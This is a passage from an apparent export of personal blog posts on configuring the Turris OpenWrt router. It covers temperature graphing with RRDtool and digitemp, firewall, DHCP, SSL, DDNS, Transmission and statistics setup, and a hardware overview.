GPRINT:temp0:MAX:\"Maximum Board\\\\: %4.1lf .C \" GPRINT:temp1:MAX:\"Maximum CPU\\\\: %4.1lf .C\\\\n\" GPRINT:temp0:AVERAGE:\"Average Board\\\\: %4.1lf .C \" GPRINT:temp1:AVERAGE:\"Average CPU\\\\: %4.1lf .C \" GPRINT:temp0:LAST:\"Current Board\\\\: %4.1lf .C \" GPRINT:temp1:LAST:\"Current CPU\\\\: %4.1lf .C\" &gt; /dev/null ' case $1 in daily) eval /usr/bin/rrdtool graph --start=\"end-2days\" --title \\'Daily graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; weekly) eval /usr/bin/rrdtool graph --start=\"end-2week\" --title \\'Weekly graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; monthly) eval /usr/bin/rrdtool graph --start=\"end-2month\" --title \\'Monthly graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; yearly) eval /usr/bin/rrdtool graph --start=\"end-1year\" --title \\'Yearly graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; 2years) eval /usr/bin/rrdtool graph --start=\"end-2years\" --title \\'2 Years graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; 5years) eval /usr/bin/rrdtool graph --start=\"end-5years\" --title \\'5 Years graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; 10years) eval /usr/bin/rrdtool graph --start=\"end-10years\" --title \\'10 Years graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; *) echo \"Please specify $0 [daily|weekly|monthly|yearly|2years|5years|10years]\" ;; esac EOF chmod a+x /data/temperature_sensors/temperature_sensors-graph.sh #Add cron entry to generate graphs cat &gt;&gt; /etc/crontabs/root &lt;&lt; EOF 7 * * * * /data/temperature_sensors/temperature_sensors-graph.sh daily 1 1 * * * /data/temperature_sensors/temperature_sensors-graph.sh weekly 2 1 * * 0 /data/temperature_sensors/temperature_sensors-graph.sh monthly 3 1 1 * * /data/temperature_sensors/temperature_sensors-graph.sh yearly 4 1 1 1 * /data/temperature_sensors/temperature_sensors-graph.sh 2years 5 1 1 1 * /data/temperature_sensors/temperature_sensors-graph.sh 5years 6 1 1 1 * /data/temperature_sensors/temperature_sensors-graph.sh 10years EOF You should be able to see the generated graphs in http://192.168.1.1/myadmin/temperature_sensors in the next few days. Here is the example: External thermometers I’m using two external thermometers to monitor temperature around router + in the room. These were built according to the following descriptions: DS18S20 article Serial Port Temperature Sensors - Serial Hardware Interface I used the serial to USB converter and it works nicely with Digitemp: gate / # digitemp_DS9097 -c/etc/digitemp.conf -t0 -q -s/dev/ttyUSB0 -o\"%.2C\" 28.00 gate / # digitemp_DS9097 -c/etc/digitemp.conf -t1 -q -s/dev/ttyUSB0 -o\"%.2C\" 20.63 The scripts are very similar to the previous solution, except for getting the data from thermometers. It happens from time to time that digitemp returns bad values, so you need to read them a few times. mkdir -p /data/mydigitemp /www3/mydigitemp #The graphs can be accessed: http://192.168.1.1/myadmin/mydigitemp ln -s /www3/mydigitemp /www3/myadmin/mydigitemp #Create RRDtool database to store the values every 10 minutes (600 seconds) for 10 years (525600 * 600 seconds) rrdtool create /data/mydigitemp/mydigitemp.rrd --step 600 \\ DS:temp0:GAUGE:1000:-273:5000 DS:temp1:GAUGE:1000:-273:5000 RRA:AVERAGE:0.5:1:525600 \\ RRA:MIN:0.5:1:525600 RRA:MAX:0.5:1:525600 #Script getting the data from thermometers cat &gt; /data/mydigitemp/mydigitemp.sh &lt;&lt; \\EOF #!/bin/sh TEMP0_ROUNDED=1000 TEMP1_ROUNDED=1000 #Sometimes the values are not in the right \"range\" and need to be read a few times while [ $TEMP0_ROUNDED -gt 50 ] || [ $TEMP0_ROUNDED -lt 5 ] ; do TEMP0=$(/usr/bin/digitemp_DS9097 -c/etc/digitemp.conf -t0 -q -s/dev/ttyUSB0 -o\"%.2C\") TEMP0_ROUNDED=$(echo $TEMP0 | awk '{print int($1+0.5)}') done while [ $TEMP1_ROUNDED -gt 50 ] || [ $TEMP1_ROUNDED -lt 5 ] ; do TEMP1=$(/usr/bin/digitemp_DS9097 -c/etc/digitemp.conf -t1 -q -s/dev/ttyUSB0 -o\"%.2C\") TEMP1_ROUNDED=$(echo $TEMP1 | awk '{print int($1+0.5)}') done /usr/bin/rrdtool update /data/mydigitemp/mydigitemp.rrd $(date +%s):$TEMP0:$TEMP1 EOF cat &gt; /data/mydigitemp/mydigitemp-graph.sh &lt;&lt; EOF #!/bin/sh RRD_FILE=\"/data/mydigitemp/mydigitemp.rrd\" DST_FILE=\"/www3/mydigitemp/$1.png\" RRD_PARAMETERS=' $DST_FILE --end=$(date +%s) --vertical-label \"Temperature .C\" --width 1024 --height 600 --lower-limit 0 DEF:temp0=$RRD_FILE:temp0:AVERAGE DEF:temp1=$RRD_FILE:temp1:AVERAGE LINE1:temp0#CF00FF:\"10 minutes average inside\\\\n\" LINE2:temp1#FF3C00:\"10 minutes average outside\\\\n\" COMMENT:\" \\\\n\" GPRINT:temp0:MIN:\"Minimum inside\\\\: %4.1lf .C \" GPRINT:temp1:MIN:\"Minimum outside\\\\: %4.1lf .C \" GPRINT:temp0:MAX:\"Maximum inside\\\\: %4.1lf .C \" GPRINT:temp1:MAX:\"Maximum outside\\\\: %4.1lf .C\\\\n\" GPRINT:temp0:AVERAGE:\"Average inside\\\\: %4.1lf .C \" GPRINT:temp1:AVERAGE:\"Average outside\\\\: %4.1lf .C \" GPRINT:temp0:LAST:\"Current inside\\\\: %4.1lf .C \" GPRINT:temp1:LAST:\"Current outside\\\\: %4.1lf .C\" &gt; /dev/null ' case $1 in daily) eval /usr/bin/rrdtool graph --start=\"end-2days\" --title \\'Daily graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; weekly) eval /usr/bin/rrdtool graph --start=\"end-2week\" --title \\'Weekly graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; monthly) eval /usr/bin/rrdtool graph --start=\"end-2month\" --title \\'Monthly graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; yearly) eval /usr/bin/rrdtool graph --start=\"end-1year\" --title \\'Yearly graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; 2years) eval /usr/bin/rrdtool graph --start=\"end-2years\" --title \\'2 Years graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; 5years) eval /usr/bin/rrdtool graph --start=\"end-5years\" --title \\'5 Years graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; 10years) eval /usr/bin/rrdtool graph --start=\"end-10years\" --title \\'10 Years graph [$(date +\"%F %H:%M\")]\\' $RRD_PARAMETERS ;; *) echo \"Please specify $0 [daily|weekly|monthly|yearly|2years|5years|10years]\" ;; esac EOF chmod a+x /data/mydigitemp/*.sh #Add cron entries to put the temperatures into the database and create graphs cat &gt;&gt; /etc/crontabs/root &lt;&lt; \\EOF */10 * * * * test -x /data/mydigitemp/mydigitemp.sh &amp;&amp; /data/mydigitemp/mydigitemp.sh 0 * * * * /data/mydigitemp/mydigitemp-graph.sh daily 1 0 * * * /data/mydigitemp/mydigitemp-graph.sh weekly 2 0 * * 0 /data/mydigitemp/mydigitemp-graph.sh monthly 3 0 1 * * /data/mydigitemp/mydigitemp-graph.sh yearly 4 0 1 1 * /data/mydigitemp/mydigitemp-graph.sh 2years 5 0 1 1 * /data/mydigitemp/mydigitemp-graph.sh 5years 6 0 1 1 * /data/mydigitemp/mydigitemp-graph.sh 10years EOF Graph example: (you can see the temperature was higher when I turned the PC near the wifi router 16:00 and 00:00) The scripts created by the steps above can be found in GitHub. Enjoy…" }, { "title": "Turris - OpenWrt configuration", "url": "/posts/turris-openwrt-configuration/", "categories": "OpenWrt, Networking, linux.xvx.cz", "tags": "turris, router, wifi", "date": "2014-04-16 00:00:00 +0200", "content": "Original post from linux.xvx.cz You can find some details about the Turris wifi router, lots of photos and some command outputs in my previous blog post “Turris - The Open Enterprise Wi-Fi Router”. Now I would like to describe how I configured it according to the network diagram: I will also need my own web pages, transmission torrent client, microsd card, Dynamic DNS and extend the luci interface to add some more stats + graphs. Here are the steps. There is no guarantee it will work for another Turris router. System + firewall changes: #Configure ssh key autologin: ssh-copy-id -i ~/.ssh/id_rsa root@192.168.1.1 uci set system.@system[0].hostname=gate uci add_list sshd.@openssh[0].Port=2222 uci add firewall rule uci set firewall.@rule[-1].name=ssh uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=2222 uci add firewall redirect uci set firewall.@redirect[-1].name=ssh_lan uci set firewall.@redirect[-1].src=lan uci set firewall.@redirect[-1].proto=tcp uci set firewall.@redirect[-1].src_dport=22 uci set firewall.@redirect[-1].dest_port=2222 uci set firewall.@redirect[-1].dest_ip=192.168.1.1 Format and mount MicroSD card: mkdir /data mkfs.ext4 -L data /dev/mmcblk0p1 uci add fstab mount uci set fstab.@mount[-1].device=/dev/mmcblk0p1 uci set fstab.@mount[-1].target=/data uci set fstab.@mount[-1].fstype=ext4 uci set fstab.@mount[-1].options=rw,sync,noatime,nodiratime uci set fstab.@mount[-1].enabled=1 uci set fstab.@mount[-1].enabled_fsck=0 Wifi configuration (I got much better speed than with the default settings): uci set wireless.radio0.channel=8 uci set wireless.radio0.htmode=HT40- uci set wireless.radio0.noscan=1 uci set wireless.radio0.bursting=1 uci set wireless.radio0.ff=1 uci set wireless.radio0.compression=1 uci set wireless.radio0.xr=1 uci set wireless.radio0.ar=1 uci set wireless.radio0.txpower=20 Change DHCP settings: uci set dhcp.lan.start=200 uci set dhcp.lan.limit=54 uci set dhcp.@dnsmasq[0].domain=xvx.cz uci set dhcp.@dnsmasq[0].leasefile=/etc/dnsmasq-dhcp.leases #Send email for new connections: echo \"dhcp-script=/etc/dnsmasq-script.sh\" &gt;&gt; /etc/dnsmasq.conf cat &gt; /etc/dnsmasq-script.sh &lt;&lt; \\EOF #!/bin/sh /bin/echo $(/bin/date +\"%F %T\") $* &gt;&gt; /etc/dnsmasq.script.log if [ \"$1\" == \"add\" ] &amp;&amp; ! grep -iq \"$2\" /etc/config/dhcp; then echo -e \"Subject: New MAC on $(uci get system.@system[0].hostname).$(uci get dhcp.@dnsmasq[0].domain)\\\\n\\\\n$(/bin/date +\"%F %T\") $*\" | sendmail petr.ruzicka@gmail.com fi EOF chmod a+x /etc/dnsmasq-script.sh # WiFi uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-work-wifi uci set dhcp.@host[-1].ip=192.168.1.2 uci set dhcp.@host[-1].mac=5c:51:4f:7e:e0:d2 uci add dhcp host uci set dhcp.@host[-1].name=andy-nb-wifi uci set dhcp.@host[-1].ip=192.168.1.3 uci set dhcp.@host[-1].mac=74:f0:6d:93:c7:3a uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-old-wifi uci set dhcp.@host[-1].ip=192.168.1.4 uci set dhcp.@host[-1].mac=00:15:00:11:48:5A uci add dhcp host uci set dhcp.@host[-1].name=andy-android-wifi uci set dhcp.@host[-1].ip=192.168.1.5 uci set dhcp.@host[-1].mac=00:23:76:D6:42:C7 uci add dhcp host uci set dhcp.@host[-1].name=peru-android-work-wifi uci set dhcp.@host[-1].ip=192.168.1.6 uci set dhcp.@host[-1].mac=a4:eb:d3:44:7a:23 uci add dhcp host uci set dhcp.@host[-1].name=peru-palm-wifi uci set dhcp.@host[-1].ip=192.168.1.7 uci set dhcp.@host[-1].mac=00:0b:6c:57:da:9a uci add dhcp host uci set dhcp.@host[-1].name=RTL8187-wifi uci set dhcp.@host[-1].ip=192.168.1.8 uci set dhcp.@host[-1].mac=00:C0:CA:54:F5:BA uci add dhcp host uci set dhcp.@host[-1].name=peru-tablet-wifi uci set dhcp.@host[-1].ip=192.168.1.9 uci set dhcp.@host[-1].mac=00:22:f4:f6:f3:0b # NIC uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-work-nic uci set dhcp.@host[-1].ip=192.168.1.130 uci set dhcp.@host[-1].mac=28:d2:44:31:31:90 uci add dhcp host uci set dhcp.@host[-1].name=andy-nb-nic uci set dhcp.@host[-1].ip=192.168.1.131 uci set dhcp.@host[-1].mac=20:cf:30:31:da:b3 uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-old-nic uci set dhcp.@host[-1].ip=192.168.1.132 uci set dhcp.@host[-1].mac=00:13:D4:D1:03:57 uci add dhcp host uci set dhcp.@host[-1].name=peru-tv-nic uci set dhcp.@host[-1].ip=192.168.1.133 uci set dhcp.@host[-1].mac=00:12:FB:94:1B:9A uci add dhcp host uci set dhcp.@host[-1].name=raspberrypi-nic uci set dhcp.@host[-1].ip=192.168.1.134 uci set dhcp.@host[-1].mac=b8:27:eb:8c:97:9e uci add dhcp host uci set dhcp.@host[-1].name=server-nic uci set dhcp.@host[-1].ip=192.168.1.135 uci set dhcp.@host[-1].mac=00:1f:c6:e9:f5:14 Set my favorite led colors: uci set rainbow.wifi=led uci set rainbow.@led[-1].color=blue uci set rainbow.@led[-1].status=auto uci set rainbow.pwr=led uci set rainbow.@led[-1].color=red uci set rainbow.@led[-1].status=auto uci set rainbow.lan=led uci set rainbow.@led[-1].color=green uci set rainbow.@led[-1].status=auto uci set rainbow.wan=led uci set rainbow.@led[-1].color=FFFF00 uci set rainbow.@led[-1].status=auto Add favorite packages and configure Midnight Commander, screen and email. opkg install bash bind-dig diffutils digitemp dstat file htop kmod-usb-serial-pl2303 less lftp lsof mc mtr nmap rsync screen ssmtp sudo tcpdump #File highlighting in \"mc\" mkdir -p /usr/lib/mc/extfs.d touch /etc/mc/sfs.ini wget --no-check-certificate https://raw.github.com/MidnightCommander/mc/master/misc/filehighlight.ini -O /etc/mc/filehighlight.ini #Favorite \"mc\" settings mkdir -p /etc/skel/.mc/ chmod 700 /etc/skel/.mc cat &gt; /etc/skel/.mc/ini &lt;&lt; EOF [Midnight-Commander] auto_save_setup=0 drop_menus=1 use_internal_edit=1 confirm_exit=0 [Layout] menubar_visible=0 message_visible=0 EOF cp -r /etc/skel/.mc /root/ #Disable mouse + path \"changer\" wget --no-check-certificate https://raw.github.com/MidnightCommander/mc/master/contrib/mc-wrapper.sh.in -O - | sed 's|@bindir@/mc|/usr/bin/mc --nomouse|' &gt; /usr/bin/mc-wrapper.sh chmod a+x /usr/bin/mc-wrapper.sh echo \"[ -x /usr/bin/mc-wrapper.sh ] &amp;&amp; alias mc='. /usr/bin/mc-wrapper.sh'\" &gt;&gt; /etc/profile #Screen settings cat &gt;&gt; /etc/screenrc &lt;&lt; EOF defscrollback 1000 termcapinfo xterm ti@:te@ hardstatus alwayslastline '%{= kG}[ %{G}%H %{g}][%= %{= kw}%?%-Lw%?%{r}(%{W}%n*%f%t%?(%u)%?%{r})%{w}%?%+Lw%?%?%= %{g}][%{B} %d/%m %{W}%c %{g}]' vbell off EOF #Prompt colors sed -i 's/^export PS1.*/export PS1='\\''\\\\\\[\\\\033\\[01;31m\\\\\\]\\\\h\\\\\\[\\\\033\\[01;34m\\\\\\] \\\\w #\\\\\\[\\\\033\\[00m\\\\\\] '\\''/' /etc/profile #Make outgoing emails to reach the SMTP server: sed -i \"s/^mailhub=.*/mailhub=mail.upcmail.cz/;s/^rewriteDomain=.*/rewriteDomain=xvx.cz/;s/^hostname.*/hostname=$(uci get system.@system[0].hostname).$(uci get dhcp.@dnsmasq[0].domain)/\" /etc/ssmtp/ssmtp.conf #Reboot email # shellcheck disable=SC2016 # Single quotes intentional - backticks expand on router, not locally sed -i '/^exit 0/i echo -e \"Subject: Reboot `uci get system.@system[0].hostname`.`uci get dhcp.@dnsmasq[0].domain`\\\\n\\\\nOpenwrt rebooted: `date; uptime`\\\\n\" | sendmail petr.ruzicka@gmail.com' /etc/rc.local #Disable IPv6 in Unbound (and flooding the logs by ipv6 error messages) uci add_list unbound.@unbound[-1].include_path=/etc/unbound/unbound_include cat &gt; /etc/unbound/unbound_include &lt;&lt; EOF server: do-ip6: no EOF Configure the DDNS - duckdns.org: uci set ddns.myddns.enabled=1 uci set ddns.myddns.service_name=duckdns.org uci set ddns.myddns.domain=gate uci set ddns.myddns.username=NA uci set ddns.myddns.password=xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx uci set ddns.myddns.ip_source=network uci set ddns.myddns.ip_network=wan uci set ddns.myddns.force_interval=72 uci set ddns.myddns.force_unit=hours uci set ddns.myddns.check_interval=10 uci set ddns.myddns.check_unit=minutes uci set 'ddns.myddns.update_url=http://www.duckdns.org/update?domains=[DOMAIN]&amp;token=[PASSWORD]&amp;ip=[IP]' Modify the lighttpd web server to enable ssl (https), serve personal pages and Transmission: opkg install lighttpd-mod-proxy #See the http://192.168.1.1/myadmin/ for main \"myadmin\" page mkdir -p /www3/myadmin/transmission-web mkdir -p /www3/myadmin/luci cp /etc/foris/foris-lighttpd-inc.conf /etc/foris/foris-lighttpd-inc.conf.orig cp /etc/lighttpd/lighttpd.conf /etc/lighttpd/lighttpd.conf.orig #Let foris \"listen\" only on 192.168.1.1 #sed -i \"s@\\$HTTP\\[\\\"url\\\"\\] !~ \\\"\\^/static\\\" {.*@\\$HTTP\\[\\\"host\\\"\\] == \\\"192\\\\.168\\\\.1\\\\.1\\\" {@\" /etc/foris/foris-lighttpd-inc.conf sed -i \"/\\$HTTP\\[\\\"url\\\"\\] !~ .*/i \\$HTTP\\[\\\"host\\\"\\] == \\\"192\\\\.168\\\\.1\\\\.1\\\" {\" /etc/lighttpd/conf.d/foris.conf echo \"}\" &gt;&gt; /etc/lighttpd/conf.d/foris.conf #Change httpd root to my own sed -i 's/www2/www3/' /etc/lighttpd/lighttpd.conf wget --no-check-certificate https://raw.github.com/ruzickap/medlanky.xvx.cz/gh-pages/index.html -O - | sed 's@facebook.com/medlanky@xvx.cz@g;s/UA-6594742-7/UA-6594742-8/' &gt; /www3/index.html uci add firewall rule uci set firewall.@rule[-1].name=https uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=443 uci add firewall rule uci set firewall.@rule[-1].name=http uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=80 #Enable SSL (https) mkdir -p /etc/lighttpd/ssl/xvx.cz chmod 0600 /etc/lighttpd/ssl/xvx.cz SUBJ=\" C=CZ ST=Czech Republic O=XvX, Inc. localityName=Brno commonName=gate.xvx.cz \" openssl req -new -x509 -subj \"$(echo -n \"$SUBJ\" | tr \"\\n\" \"/\")\" -keyout /etc/lighttpd/ssl/xvx.cz/server.pem -out /etc/lighttpd/ssl/xvx.cz/server.pem -days 3650 -nodes -newkey rsa:2048 -sha256 cat &gt;&gt; /etc/lighttpd/lighttpd.conf &lt;&lt; \\EOF $SERVER[\"socket\"] == \":443\" { ssl.engine = \"enable\" ssl.pemfile = \"/etc/lighttpd/ssl/xvx.cz/server.pem\" } server.modules += ( \"mod_proxy\", ) #Access the transmission torrent client using: https://192.168.1.1/myadmin/transmission-web $HTTP[\"url\"] =~ \"^/myadmin/transmission*\" { # Use proxy for redirection to Transmission's own web interface proxy.server = ( \"\" =&gt; ( ( \"host\" =&gt; \"127.0.0.1\", \"port\" =&gt; 9091 ) ) ) } $HTTP[\"url\"] =~ \"^/myadmin/*\" { server.dir-listing = \"enable\" } alias.url += ( \"/myadmin/luci\" =&gt; \"/www/cgi-bin/luci\", ) EOF Watchcat is used to monitor network connection “pingability” to 8.8.8.8 otherwise the router is rebooted. Set the checking time for watchcat for 1 hour: opkg install luci-app-watchcat /etc/uci-defaults/50-watchcat uci set system.@watchcat[0].period=1h /etc/init.d/watchcat enable Add a few more stats to the LuCi interface: opkg install collectd-mod-conntrack collectd-mod-cpu collectd-mod-df collectd-mod-disk collectd-mod-dns collectd-mod-irq collectd-mod-memory collectd-mod-ping collectd-mod-processes collectd-mod-syslog collectd-mod-tcpconns collectd-mod-uptime mkdir -p /etc/collectd/conf.d #Make the stats permanent uci set luci_statistics.collectd_rrdtool.DataDir=/etc/collectd uci set luci_statistics.collectd_ping.enable=1 uci set luci_statistics.collectd_ping.Hosts=www.google.com uci set luci_statistics.collectd_df.enable=1 uci set luci_statistics.collectd_df.Devices=/dev/mmcblk0p1 uci set luci_statistics.collectd_df.MountPoints=/data uci set luci_statistics.collectd_df.FSTypes=ext4 uci set luci_statistics.collectd_disk.enable=1 uci set luci_statistics.collectd_disk.Disks=mmcblk0 uci set luci_statistics.collectd_dns.enable=1 uci set luci_statistics.collectd_dns.Interfaces=any uci set luci_statistics.collectd_interface.Interfaces=\"eth2 wlan0 br-lan\" uci set luci_statistics.collectd_iptables.enable=0 uci set luci_statistics.collectd_irq.enable=1 uci set luci_statistics.collectd_irq.Irqs=\"19 24 28\" uci set luci_statistics.collectd_processes.Processes=\"lighttpd collectd transmission-daemon ucollect unbound\" uci set luci_statistics.collectd_tcpconns.LocalPorts=\"2222 443 80\" uci set luci_statistics.collectd_olsrd.enable=0 uci set luci_statistics.collectd_rrdtool.CacheTimeout=120 uci set luci_statistics.collectd_rrdtool.CacheFlush=900 #Use syslog for logging cat &gt; /etc/collectd/conf.d/my_collectd.conf &lt;&lt; EOF LoadPlugin syslog &lt;Plugin syslog&gt; LogLevel \"info\" &lt;/Plugin&gt; EOF #Fix some graphing issues chmod 644 /etc/config/luci_statistics Configure vnstat - software for monitoring/graphing network throughput: opkg install luci-app-vnstat vnstati mkdir /etc/vnstat /www3/myadmin/vnstat sed -i 's@^\\(DatabaseDir\\).*@\\1 \"/etc/vnstat\"@' /etc/vnstat.conf vnstat -u -i eth2 vnstat -u -i wlan0 vnstat -u -i br-lan echo \"*/5 * * * * vnstat -u\" &gt;&gt; /etc/crontabs/root cat &gt; /etc/graphs-vnstat.sh &lt;&lt; \\EOF #!/bin/sh # vnstati image generation script. # Source: https://code.google.com/p/x-wrt/source/browse/package/webif/files/www/cgi-bin/webif/graphs-vnstat.sh WWW_D=/www3/myadmin/vnstat # output images to here LIB_D=$(awk -F \\\" '/^DatabaseDir/ { print $2 }' /etc/vnstat.conf) # db location BIN=/usr/bin/vnstati # which vnstati outputs=\"s h d t m\" # what images to generate # Sanity checks [ -d \"$WWW_D\" ] || mkdir -p \"$WWW_D\" # make the folder if it doesn't exist. # End of config changes interfaces=\"$(ls -1 $LIB_D)\" if [ -z \"$interfaces\" ]; then echo \"No database found, nothing to do.\" echo \"A new database can be created with the following command: \" echo \" vnstat -u -i eth0\" exit 0 else for interface in $interfaces; do for output in $outputs; do $BIN -${output} -i $interface -o $WWW_D/vnstat_${interface}_${output}.png done done fi exit 1 EOF chmod a+x /etc/graphs-vnstat.sh echo \"0 2 * * * /etc/graphs-vnstat.sh\" &gt;&gt; /etc/crontabs/root cat &gt; /www3/myadmin/vnstat/index.html &lt;&lt; EOF &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"300\"&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Traffic of OpenWRT interfaces&lt;/title&gt; &lt;/head&gt; &lt;body&gt; EOF for IFCE in \"$(awk -F \\\" '/^DatabaseDir/ { print $2 }' /etc/vnstat.conf)\"/*; do cat &gt;&gt; /www3/myadmin/vnstat/index.html &lt;&lt; EOF &lt;h2&gt;Traffic of Interface $IFCE&lt;/h2&gt; &lt;table&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt; &lt;img src=\"vnstat_${IFCE}_s.png\" alt=\"$IFCE Summary\" /&gt; &lt;/td&gt; &lt;td&gt; &lt;img src=\"vnstat_${IFCE}_h.png\" alt=\"$IFCE Hourly\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=\"top\"&gt; &lt;img src=\"vnstat_${IFCE}_d.png\" alt=\"$IFCE Daily\" /&gt; &lt;/td&gt; &lt;td valign=\"top\"&gt; &lt;img src=\"vnstat_${IFCE}_t.png\" alt=\"$IFCE Top 10\" /&gt; &lt;br /&gt; &lt;img src=\"vnstat_${IFCE}_m.png\" alt=\"$IFCE Monthly\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; EOF done cat &gt;&gt; /www3/myadmin/vnstat/index.html &lt;&lt; EOF &lt;/body&gt; &lt;/html&gt; EOF Here is the example how the stats look like: Transmission bittorrent client configuration: opkg install transmission-remote transmission-web mkdir -p /data/torrents/torrents-completed /data/torrents/torrents-incomplete /data/torrents/torrents /data/torrents/config uci set transmission.@transmission[-1].enabled=1 uci set transmission.@transmission[-1].config_dir=/data/torrents/config uci set transmission.@transmission[-1].download_dir=/data/torrents/torrents-completed uci set transmission.@transmission[-1].incomplete_dir_enabled=true uci set transmission.@transmission[-1].incomplete_dir=/data/torrents/torrents-incomplete uci set transmission.@transmission[-1].blocklist_enabled=1 uci set \"transmission.@transmission[-1].blocklist_url=http://list.iblocklist.com/?list=bt_level1&amp;fileformat=p2p&amp;archiveformat=zip\" uci set transmission.@transmission[-1].speed_limit_down_enabled=true uci set transmission.@transmission[-1].speed_limit_up_enabled=true uci set transmission.@transmission[-1].speed_limit_down=800 uci set transmission.@transmission[-1].speed_limit_up=10 uci set transmission.@transmission[-1].alt_speed_enabled=true uci set transmission.@transmission[-1].alt_speed_down=99999 uci set transmission.@transmission[-1].alt_speed_up=10 uci set transmission.@transmission[-1].alt_speed_time_enabled=true uci set transmission.@transmission[-1].alt_speed_time_day=127 uci set transmission.@transmission[-1].alt_speed_time_begin=60 uci set transmission.@transmission[-1].alt_speed_time_end=420 uci set transmission.@transmission[-1].rpc_whitelist_enabled=false uci set transmission.@transmission[-1].start_added_torrents=true uci set transmission.@transmission[-1].script_torrent_done_enabled=true uci set transmission.@transmission[-1].script_torrent_done_filename=/etc/torrent-done.sh uci set transmission.@transmission[-1].watch_dir_enabled=true uci set transmission.@transmission[-1].watch_dir=/data/torrents/torrents/ uci set transmission.@transmission[-1].rpc_url=/myadmin/transmission/ uci set transmission.@transmission[-1].rpc_authentication_required=true uci set transmission.@transmission[-1].rpc_username=ruzickap uci set transmission.@transmission[-1].rpc_password=xxxx uci set transmission.@transmission[-1].ratio_limit=0 uci set transmission.@transmission[-1].ratio_limit_enabled=true uci set transmission.@transmission[-1].upload_slots_per_torrent=5 uci set transmission.@transmission[-1].trash_original_torrent_files=true uci set transmission.@transmission[-1].download_queue_size=2 uci add firewall rule uci set firewall.@rule[-1].name=transmission uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcpudp uci set firewall.@rule[-1].dest_port=51413 /etc/init.d/transmission enable #Script sending email when download finishes. cat &gt; /etc/torrent-done.sh &lt;&lt; \\EOF #!/bin/sh echo -e \"Subject: $TR_TORRENT_NAME finished.\\n\\nTransmission finished downloading \\\"$TR_TORRENT_NAME\\\" on $TR_TIME_LOCALTIME\" | /usr/sbin/ssmtp petr.ruzicka@gmail.com EOF chmod a+x /etc/torrent-done.sh #Disable IPv6 error logging to syslog (/var/log/messages): 2014-04-19T20:39:39+02:00 err transmission-daemon[23385]: Couldn't connect socket 116 to 2001:0:9d38:6ab8:9a:17df:3f57:fef9, port 61999 (errno 1 - Operation not permitted) (net.c:286) sed -i 's/source(src);/source(src); filter(f_transmission_ipv6_errors);/' /etc/syslog-ng.conf cat &gt;&gt; /etc/syslog-ng.conf &lt;&lt; EOF filter f_transmission_ipv6_errors { not match(\".*transmission-daemon.*\" value(PROGRAM)) or not level(err) or not message(\".*connect socket.*errno 1 - Operation not permitted.*\"); }; EOF To access the transmission using RPC (for example from Android Transdroid client) you need to specify the following: https://ruzickap@gate.xvx.cz:443/myadmin/transmission/rpc Save and reboot to apply all changes: uci commit reboot The configuration files created by the steps above can be found in GitHub. Next time I’m going to describe how to graph the temperature using RRDtool. :-)" }, { "title": "Turris - The Open Enterprise Wi-Fi Router", "url": "/posts/turris-the-open-enterprise-wi-fi-router/", "categories": "OpenWrt, Networking, linux.xvx.cz", "tags": "turris, router, wifi", "date": "2014-04-09 00:00:00 +0200", "content": "Original post from linux.xvx.cz A few months ago I joined the Turris project (turris.cz) which is a not-for-profit research project of CZ.NIC. I don’t want to describe the details of the project, because you can find it on its web page. In short the company standing behind the project takes care of Internet security and their idea was to measure the number of attacks / suspicious traffic by giving the wifi routers to the participants. The wifi router was designed by the company and it’s quite a powerful machine that costs $600. In the first “round” some project members got the wifi router for free so I would like to share here the details about it, because it’s open hardware/software platform. Hardware The details about the hardware including design and manufacture data is published under the terms of the CERN Open Hardware License and can be found here: Hardware documentation. These details are really nice, because everybody can look at it and improve… Here are some pictures of how the router looks: The well-designed metal box looks much better than any cheap routers I worked with before. Another photo showing it from the back side: Let’s see the hardware side - which is really interesting: Processor Freescale P2020 running at 1200 MHz 2 GB of DDR3 RAM in a SO-DIMM slot 16 MB NOR and 256 MB NAND flash Dedicated gigabit WAN and 5 gigabit LAN ports (using the QCA8337N switch chip) Wifi 802.11a/b/g/n with 3x3 MIMO and removable external antennas 2x USB 2.0 port 1 free miniPCIe slot UART, SPI and I2C connected to a pin-header for easy customization Power consumption is 9.5 W without load, 12.5 W with CPU load and 14 W with maximum wired and Wifi network load. Measured power consumption includes the supplied power adapter. Software - OpenWrt The most important part (at least for me) is - the router is delivered with preinstalled OpenWrt. The router itself was designed to “fit” to this Linux distribution. Again all software used can be found in git repositories: https://gitlab.labs.nic.cz/public/projects?search=turris The details about used software are here: https://www.turris.cz/en/software Once you turn on the router you have to finish the wizard which will help you do the basic configuration and register the router. After the registration you can see these stats, collected by router and sent to the NIC.cz. Screenshots from wizard are in the photo gallery at the end. 